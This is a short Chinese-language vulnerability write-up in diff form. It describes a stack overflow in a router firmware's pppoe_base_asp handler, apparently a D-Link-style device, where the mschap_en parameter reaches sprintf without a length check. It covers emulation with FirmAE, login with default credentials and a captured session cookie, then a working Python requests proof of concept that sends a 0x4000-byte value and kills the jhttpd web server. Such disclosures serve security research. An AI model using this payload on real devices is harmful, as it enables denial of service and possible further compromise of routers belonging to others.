@@ -1,1 +1,28 @@
+打开ida查看，发现在pppoe_base_asp函数中，通过asp获得了很多get参数
 
+其中mschap_en参数，会在后面被sprintf函数拼接到局部变量上
+
+
+由于未对参数进行长度校验，故此处可以造成栈溢出漏洞
+利用FirmAE可以直接进行固件模拟
+浏览器访问192.168.0.1发现可以正常访问，输入admin/admin进行登录
+
+登录后获取cookie：wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632
+
+运行payload之前，查看当前运行的进程
+
+发现jhttpd正常运行
+发送payload
+import requests
+url="http://192.168.0.1/pppoe_base.asp?en=off&only_pppoe=off&pap_en=1&chap_en=1&mschap_en="+"0"*0x4000+"&any_acname=1&mschap2_en=0&acn=dlink-PPPoE&stip=10.0.0.1&endip=255.255.255.0&chktm=3&chkmax=3&dns0=0.0.0.0&dns1=0.0.0.0&_=1750660863757"
+
+
+headers={"cookie":"wys_userid=admin,wys_passwd=520E1BFD4CDE217D0A5824AE7EA60632"}
+response=requests.get(url=url,headers=headers)
+print(response.text)
+
+
+发现没有得到正确的响应
+再次访问也已经无效
+
+查看进程已经看不到jhttpd了
